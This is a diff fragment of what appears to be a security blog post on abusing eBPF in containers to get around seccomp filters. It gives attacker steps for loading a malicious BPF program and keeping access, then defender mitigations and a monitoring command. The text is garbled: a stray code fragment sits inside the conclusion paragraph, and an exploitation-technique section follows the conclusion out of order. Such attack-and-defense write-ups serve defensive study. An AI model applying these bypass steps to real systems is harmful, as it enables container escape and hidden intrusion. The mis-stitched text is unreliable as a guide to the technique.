+tracee <span class="nt">--trace</span> <span class="nb">comm</span><span class="o">=</span>bpf,seccomp
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Attacker hat on</strong></p>
+
+<ol>
+  <li>Identify a target container with seccomp filters but eBPF capabilities</li>
+  <li>Analyze the seccomp profile to determine which syscalls are permitted</li>
+  <li>Develop an eBPF program that uses permitted syscalls as entry points</li>
+  <li>Use eBPF helper functions to perform operations that would normally be blocked</li>
+  <li>Load the malicious BPF program through a permitted syscall</li>
+  <li>Trigger the exploit to execute restricted operations</li>
+  <li>Maintain access through the eBPF program despite seccomp restrictions</li>
+</ol>
+
+<p><strong>Defender hat on</strong></p>
+
+<ol>
+  <li>Remove CAP_BPF from container environments</li>
+  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
+  <li>Use seccomp profiles that block bpf() syscall and related functions</li>
+  <li>Monitor for unexpected eBPF programs in container environments</li>
+  <li>Implement runtime security monitoring that can detect unusual kernel activity</li>
+  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
+</ol>
+
+<p><strong>Conclusion</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to execute kernel code through eBPF provides attackers with powerful primitives to bypass security controls like seccomp. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments.
+    return false;
+}</p>
+
+<h3 id="exploitation-technique">Exploitation Technique</h3>
+
+<p>The exploit leverages eBPF’s ability to execute code in kernel context, bypassing seccomp in several ways:</p>
+
+<ol>
+  <li><strong>Indirect Syscall Execution</strong>: Using eBPF helper functions that perform operations similar to blocked syscalls</li>
+  <li><strong>Kernel Function Access</strong>: Accessing kernel functions directly, bypassing the syscall interface</li>
+  <li><strong>Syscall Argument Manipulation</strong>: Modifying arguments of permitted syscalls to perform restricted operations</li>
+  <li><strong>Return Value Spoofing</strong>: Altering the return values of syscalls to hide malicious activity</li>
+</ol>
 
                     </div>
                 </article>
